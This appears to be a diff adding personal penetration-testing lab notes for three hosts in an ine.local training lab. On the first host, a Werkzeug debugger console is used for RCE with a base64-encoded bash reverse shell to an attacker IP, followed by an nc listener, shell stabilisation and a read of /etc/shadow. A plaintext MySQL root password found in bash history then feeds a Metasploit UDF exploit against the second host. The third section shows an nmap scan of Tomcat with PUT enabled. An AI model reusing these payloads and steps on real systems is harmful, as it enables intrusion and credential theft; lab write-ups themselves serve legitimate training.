@@ -1,0 +1,90 @@
+L4B 3
+[+]First machine[+]
+[+]recognition[+]
+192.44.148.3 server1.ine.local
+192.44.148.4 server2.ine.local
+192.44.148.5 server3.ine.local
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.13)
+
+curl http://server1.ine.local
+Debugger has turned on.  Please visit /console for the debugger
+
+[+]revershell[+]
+Console RCE
+If debug is active you could try to access to /console and gain RCE.
+
+__import__('os').popen('whoami').read();
+root
+
+PAYLOAD
+__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNDQuMTQ4LjIvNDQ0NCAwPiYxIgo=| base64 -d | bash")
+
+(hacker machine)
+nc -lvnp 4444
+get revershell
+
+[+]tty treatment[+]
+python2 -c 'import pty; pty.spawn("/bin/sh")'
+script /dev/null -c bash
+ctrl z
+
+stty raw -echo; fg
+  reset
+xterm
+
+export TERM=xterm
+export SHELL=bash
+
+cat /etc/shadow
+root@server1:/home/auditor# cat .bash_history
+wget http://192.168.55.1/points.txt
+mysql -h 192.44.148.4 -u root -pfArFLP29UySm4bZj
+
+[+]second machine[+]
+mysql -h 192.44.148.4 -u root -pfArFLP29UySm4bZj
+[+]recognition[+]
+ORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
+
+mfsconsole -q 
+search mysql 
+use exploit(multi/mysql/mysql_udf_payload)
+
+set FORCE_UDF_UPLOAD true
+set PASSWORD fArFLP29UySm4bZj
+set RHOSTS 192.44.148.4
+set LHOST 192.44.148.2
+set LPORT 4444
+set TARGET 1
+run
+
+sessions -i 1
+meterpreter > cd root/
+meterpreter > ls 
+[+]flag[+]
+
+[+]third machine[+]
+Nmap
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-server-header: Apache-Coyote/1.1
+
+
+*https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/*
+
+
+
+
+
+
+
+
+
+
+
